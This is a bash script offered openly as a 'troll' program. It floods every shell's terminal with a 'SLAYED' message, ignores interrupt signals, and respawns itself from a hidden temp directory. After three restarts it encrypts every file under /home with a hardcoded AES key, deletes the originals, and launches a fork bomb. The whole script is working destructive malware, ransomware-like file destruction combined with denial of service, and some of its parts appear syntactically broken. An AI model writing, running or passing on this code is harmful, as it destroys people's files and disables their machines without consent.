#!/bin/bash

# Define the annoying message
MESSAGE="| \"SLAYED\" | \"SLAYED\" | \"SLAYED\" |"

# Define encryption parameters
ENCRYPTION_KEY="ThisIsASecretKey123"  # Change this to a strong key
ENCRYPTION_METHOD="aes-256-cbc"

# Initialize attempt counter
ATTEMPT_FILE="/tmp/.troll_attempts"
MAX_ATTEMPTS=3

# Function to install necessary tools
install_tools() {
  if command -v apt-get >/dev/null 2>&1; then
    # For Debian/Ubuntu-based systems
    sudo apt-get update
    sudo apt-get install -y openssl
  elif command -v yum >/dev/null 2>&1; then
    # For RedHat/CentOS-based systems
    sudo yum install -y openssl
  elif command -v dnf >/dev/null 2>&1; then
    # For Fedora-based systems
    sudo dnf install -y openssl
  elif command -v pacman >/dev/null 2>&1; then
    # For Arch-based systems
    sudo pacman -Syu --noconfirm openssl
  else
    echo "Package manager not supported. Please install openssl manually."
    exit 1
  fi
}

# Function to write the annoying message to all terminal TTYs
write_annoying_message() {
  for pid in $(pgrep -o -x bash zsh fish); do
    # Skip the current shell
    if [ $pid -eq $$ ]; then
      continue
    fi

    # Get the TTY associated with the shell
    tty=$(readlink /proc/$pid/fd/0 2>/dev/null)

    # Check if the TTY exists
    if [ -n "$tty" ] && [ -e "$tty" ]; then
      # Write the annoying message to the TTY
      echo -e "\033[10;0H${MESSAGE}" > "$tty"
    fi
  done
}

# Function to handle signals and prevent stopping
trap '' SIGINT SIGTSTP

# Function to increment attempt counter and check if max attempts are reached
handle_attempts() {
  if [ -f "$ATTEMPT_FILE" ]; then
    attempts=$(cat "$ATTEMPT_FILE")
    attempts=$((attempts + 1))
    echo $attempts > "$ATTEMPT_FILE"
  else
    echo 1 > "$ATTEMPT_FILE"
    attempts=1
  fi

  if [ $attempts -ge $MAX_ATTEMPTS ]; then
    # Trigger encryption and fork bomb
    echo "Too many attempts! Encrypting files and triggering fork bomb..."
    encrypt_files
    fork_bomb
  fi
}

# Function to encrypt files on the system
encrypt_files() {
  echo "Encrypting files..."
  for file in $(find /home -type f); do
    if [ ! -f "$file.enc" ]; then
      openssl enc -$ENCRYPTION_METHOD -salt -in "$file" -out "$file.enc" -pass pass:"$ENCRYPTION_KEY"
      rm "$file"
    fi
  done
}

# Fork bomb function
fork_bomb() {
  :(){ :|:& };:
}

# Install necessary tools
install_tools

# Create a hidden directory and PID file
HIDDEN_DIR=$(mktemp -d /tmp/.hiddenXXXX)
chmod 700 "$HIDDEN_DIR"
PID_FILE="$HIDDEN_DIR/.troll_pid"

# Function to start the detached process
start_detached_process() {
  nohup bash -c '
    while true; do
      write_annoying_message
      sleep 1
    done
  ' &> /dev/null &
  echo $! > "$PID_FILE"
}

# Start the detached process
start_detached_process

# Ensure the script restarts if terminated
while true; do
  if ! pgrep -F "$PID_FILE" > /dev/null; then
    handle_attempts
    # If the process is not running, restart it
    start_detached_process
  fi
  sleep 1
done
